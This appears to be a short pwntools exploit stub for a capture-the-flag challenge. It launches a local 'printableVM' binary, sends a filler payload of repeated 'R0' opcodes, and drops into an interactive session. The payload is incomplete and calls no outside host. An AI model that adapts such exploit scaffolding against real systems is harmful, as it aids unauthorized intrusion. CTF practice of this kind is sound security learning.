from pwn import * 

p = process("./printableVM")

payload1 = ""
payload1 += "R0"*0x80

pause()

p.sendafter("opcode :",payload1)

p.interactive()